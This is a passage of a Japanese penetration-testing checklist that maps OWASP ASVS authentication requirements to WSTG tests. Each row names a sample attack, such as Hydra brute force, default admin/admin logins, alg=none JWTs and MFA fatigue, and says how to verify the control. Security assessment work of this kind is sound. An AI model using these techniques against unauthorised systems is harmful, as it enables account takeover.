| V6.2.12 | L2 | 侵害PWリスト照合 | 部分対応 | 既知漏えいPW拒否確認 | サービス連携有無 | WSTG-ATHN-07 | 「Summer2020!」等漏えい既知PWが通る | 既知漏えいPWを登録/変更で試行し拒否判定を確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy |

---

## V6.3 一般的な認証セキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.3.1 | L1 | 攻撃対策（レート制限等）を実装 | 対応可 | 連続試行/遅延/ロック挙動確認 |  | WSTG-ATHN-03 | Hydra等で高速総当たり→ロック/遅延が効かず突破 | 一定回数失敗後のロック/遅延/通知発火を観察 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism |
| V6.3.2 | L1 | 既定アカウントの不存在/無効化 | 対応可 | admin/root等のログイン試行 |  | WSTG-ATHN-02 | ベンダ既定(admin/admin等)でログイン成功 | 既知既定資格情報での認証試行と成功可否を確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials |
| V6.3.3 | L2 | MFA必須（L3はハードウェア要素含む） | 部分対応 | MFA有無/要素種/フィッシング耐性を確認 | パスキー/FIDO推奨 | WSTG-ATHN-11 | TOTP/SMS等の2要素をバイパス（再認証欠如/再利用） | MFA登録/認証/リカバリ経路での回避可否を試験 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |
| V6.3.4 | L2 | 全認証経路で統一強度・無許可経路なし | 部分対応 | バックドア/隠しエンドポイント探索 |  | WSTG-ATHN-04 | 直リンク/モバイルAPIで認証回避（パラメータ改竄等） | 代替UI/API直叩き等で認証スキーマの迂回有無を確認 | https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema |
| V6.3.5 | L3 | 異常サインインのユーザ通知 | 部分対応 | 地理/UA/失敗後成功の通知有無 |  | WSTG-ATHN-09 | 異常地点/新端末から成功しても通知が届かない | 認証履歴に影響する操作後のメール/アラート送信有無を確認 | https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities |
| V6.3.6 | L3 | メールを認証要素として不使用 | 対応可 | メールリンクのみでの認証不可を確認 |  | WSTG-ATHN-10 | メールのマジックリンク単独で恒常ログイン可能 | 代替チャネル(メール/SMS)の強度と単要素運用の有無を確認 | https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel |
| V6.3.7 | L3 | 資格情報更新後のユーザ通知 | 部分対応 | メアド/UN/PW変更時の通知確認 |  | WSTG-ATHN-09 | パスワード/メール変更後も通知が無く乗っ取り継続 | 変更/リセット直後の通知(メール/監査ログ)発行有無を確認 | https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities |
| V6.3.8 | L3 | 認証エラーでユーザ存在を推測不可 | 対応可 | エラーメッセージ/応答時間の差異検査 | 登録/忘却経路も対象 | WSTG-IDNT-04 | ログイン/リセットで存在/不存在の文言差異や時間差 | 成功/失敗/未登録での応答本文/時間の差を比較 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account |

## V6.4 認証要素のライフサイクルとリカバリ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応WSTG | 具体的攻撃例 | 精査方法（検出理由） | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.4.1 | L1 | 初期PW/コードは安全生成・短期失効 | 対応可 | 初期化フローの失効確認 |  | WSTG-ATHN-09 | 有効期限切れの初期化リンク/リセットトークンが再利用できる | 期限超過・一度使用済みトークンで再度リクエストし受理されるかを確認（使い回し/長寿命の検出） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities |
| V6.4.2 | L1 | PWヒント/秘密の質問を不使用 | 対応可 | UI/文言の有無確認 |  | WSTG-ATHN-08 | 秘密の質問の総当り/公開情報からの推測 | 回答のレート制限/ロック有無と弱い質問・回答の受理を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer |
| V6.4.3 | L2 | 安全なPWリセット（MFAバイパス不可） | 部分対応 | リセット経路での本人性確認 |  | WSTG-ATHN-09 / WSTG-ATHN-11 | リセットリンクだけでMFAを回避して再ログイン | MFA未完了状態でのリセット完了可否・弱いリセットトークン受理を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities<br>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |
| V6.4.4 | L2 | MFA要素紛失時は登録時同等の再本人確認 | 範囲外 | 手続/運用ヒアリング中心 |  | - | - | - | - |
| V6.4.5 | L3 | 期限切れ前の更新案内＋リマインダ | 範囲外 | 通知運用の確認 |  | - | - | - | - |
| V6.4.6 | L3 | 管理者はリセット開始のみ可（PW設定不可） | 部分対応 | 管理画面の権限範囲確認 | 代理変更防止 | WSTG-ATHN-09 | 管理UIからユーザPWを直接設定して乗っ取り | 管理UIで「リセット開始のみ」になっているか、直接設定が可能かを操作検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities |

---

## V6.5 一般的な多要素認証要件

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応WSTG | 具体的攻撃例 | 精査方法（検出理由） | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.5.1 | L2 | ルックアップ/経路外/ TOTP は一回限り使用 | 対応可 | 再利用試行の拒否確認 |  | WSTG-ATHN-11 | 同一TOTP/バックアップコードの再送で再認証成功 | 同一コードの二度目使用を試し受理されないことを確認（ワンタイム性） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |
| V6.5.2 | L2 | 低エントロピーのルックアップはソルト付ハッシュ保管 | 範囲外 | 保管方式は設計確認 |  | - | - | - | - |
| V6.5.3 | L2 | シード/コードはCSPRNGで生成 | 範囲外 | 実装/設計の確認 |  | - | - | - | - |
| V6.5.4 | L2 | ルックアップ/経路外コードに≥20ビットの熵 | 範囲外 | 桁数/文字集合の設計確認 |  | - | - | - | - |
| V6.5.5 | L2 | 経路外/TOTPの有効時間制限（10分/30秒） | 部分対応 | 期限超過時の拒否確認 |  | WSTG-ATHN-11 | 失効後のTOTP/コードが受理される | 有効期限超過での認証可否を確認（失効未実装の検出） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |
| V6.5.6 | L3 | あらゆる要素は紛失時に無効化可能 | 部分対応 | 端末紛失時の失効手続確認 |  | WSTG-ATHN-11 | 紛失登録要素（TOTPデバイス/プッシュ端末）で引き続き認証可能 | 管理画面/自己操作での要素失効後に再利用できないことを確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |
| V6.5.7 | L3 | 生体は二次要素としてのみ使用 | 部分対応 | 生体単体ログイン不可を確認 |  | WSTG-ATHN-11 | 生体のみ（他要素なし）でリスク操作に成功 | 生体のみ許容のフロー有無と高リスク操作での要素数検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |
| V6.5.8 | L3 | TOTPの時刻検証は信頼時間源に基づく | 部分対応 | 端末時刻改ざん耐性の確認 |  | WSTG-ATHN-11 | 端末時計を大幅にずらしてTOTPを通過 | 許容ドリフト超過でも受理されるかを確認（時刻検証欠如） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |

---

## V6.6 経路外認証メカニズム

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応WSTG | 具体的攻撃例 | 精査方法（検出理由） | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.6.1 | L2 | PSTN/SMSは要電話番号検証・代替手段提供（L3は不可） | 部分対応 | SMS依存の度合い/回避策確認 | リスク告知有無 | WSTG-ATHN-10 | SMS番号未検証でOTPが配信・承認される | 異なる未検証番号/変更直後の番号でOTPが通るかを確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel |
| V6.6.2 | L2 | 経路外コードは元リクエストにバインド（再利用不可） | 対応可 | 異セッション/時間差試行で確認 |  | WSTG-ATHN-10 | 別ブラウザ/別セッションで同一コードを使い回して認証 | コード再利用・別端末/別セッション適用で受理されないことを確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel |
| V6.6.3 | L2 | コード型経路外はレート制限＋高エントロピー検討 | 対応可 | 連続試行のブロック確認 | 64ビット推奨 | WSTG-ATHN-03 | 経路外コードの総当り（連続誤入力での通過） | 一定回数超過でのロック/遅延/追加検証の発動を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism |
| V6.6.4 | L3 | プッシュ利用時にレート制限/番号照合で爆撃対策 | 部分対応 | 連投時の抑制動作確認 |  | WSTG-ATHN-11 | プッシュ通知の連投（MFA疲労攻撃）で誤承認を誘発 | 高頻度プッシュ時の抑止/番号一致（Number Matching）等の確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication |

---

## V6.7 暗号認証メカニズム

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応WSTG | 具体的攻撃例 | 精査方法（検出理由） | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.7.1 | L3 | 検証用証明書を改ざん耐性の方法で保管 | 範囲外 | 保管方式の設計確認 | HSM/OS保護等 | - | - | - | - |
| V6.7.2 | L3 | チャレンジナンス≥64bitで一意 | 対応可 | 重複/短小値の検証困難のため設計確認 |  | WSTG-SESS-01 | 予測可能/短小ナンスでチャレンジ再利用・衝突 | ナンスの長さ・一意性・推測可能性（統計/衝突観測）を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema |

---

## V6.8 アイデンティティプロバイダによる認証

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応WSTG | 具体的攻撃例 | 精査方法（検出理由） | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.8.1 | L2 | IdP間なりすまし防止（IdPID×UserIDの組合せ識別） | 部分対応 | 同一メールで別IdPの衝突確認 |  | WSTG-ATHZ-05 | 別IdPの同一メールで既存アカウントにリンク（iss/sub未検証） | `iss`と`sub`の組合せ検証/IdP固有IDのバインド有無をトークン解析で確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses |
| V6.8.2 | L2 | JWT/SAML等の署名必須・検証 | 対応可 | 署名無し/無効署名の拒否確認 |  | WSTG-SESS-10 | `alg=none`/弱鍵/署名改ざんJWTで通過、SAML署名未検証 | トークン改変後の受理可否/アルゴリズム固定/鍵管理を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens |
| V6.8.3 | L2 | SAMLアサーションの一意利用（リプレイ防止） | 対応可 | 二重送信の拒否確認 |  | WSTG-ATHZ-05 | 取得済みアサーション/コードの再送で再認証成功 | 一度使用済みトークン/コードの再送を行い受理不可であることを確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses |
| V6.8.4 | L2 | 期待する認証強度/方法/時刻を検証（acr/amr/auth_time等） | 部分対応 | IdPクレーム検査とフォールバック確認 | 情報未提供時の既定動作 | WSTG-SESS-10 / WSTG-ATHZ-05 | `acr`が要求値未満/`amr`不一致/古い`auth_time`でも高リスク操作が成功 | 受信トークンのクレームとアプリ側ポリシーの整合を確認（不足・不一致受理の検出） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens<br>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses |


